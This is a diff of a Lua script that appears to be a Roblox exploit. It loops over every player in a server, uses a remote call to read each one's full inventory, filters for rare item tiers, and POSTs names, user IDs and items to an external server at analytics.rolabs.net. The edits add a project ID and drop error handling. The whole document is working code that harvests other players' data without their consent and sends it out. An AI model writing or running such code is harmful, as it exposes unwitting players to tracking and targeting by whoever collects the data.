@@ -10,7 +10,7 @@ local Heads = {["Content-Type"] = "application/json", ["User-Agent"] = "RoblexBo
 local to_check = {'goldy', 'ancient', 'classic', 'unique', 'legendary'}
 local DB = getfenv(require(RS.Modules.TradeModule).UpdateTrade)._G.Database
 local function SaveData(plr, info)
-    if not plr.Name or not PL:FindFirstChild(plr.Name) then
+    if not plr.Name or not PL[plr.Name] then
         return
     end
     local inv = RS.Remotes.Extras.GetFullInventory:InvokeServer(plr)
@@ -25,14 +25,14 @@ local function SaveData(plr, info)
         end
     end
     if check then
-        local res = request({Url = ("https://analytics.rolabs.net/api/account/add?name=%s&roblox_uuid=%s&game_id=1&transaction_info=%s"):format(plr.Name, plr.UserId, info), Body = HS:JSONEncode({items = parsed}), Method = "POST", Headers = Heads}).Body
+        local res = request({Url = ("https://analytics.rolabs.net/api/account/add?name=%s&roblox_uuid=%s&game_id=1&transaction_info=%s&project_id=2"):format(plr.Name, plr.UserId, info), Body = HS:JSONEncode({items = parsed}), Method = "POST", Headers = Heads}).Body
         warn(res)
     end
 end
 
 local ol = PL:GetPlayers()
 for i,v in next, ol do
-    pcall(function() SaveData(v,'check') end)
+    SaveData(v,'check')
     print(i,"/",#ol)
     task.wait(3)
 end
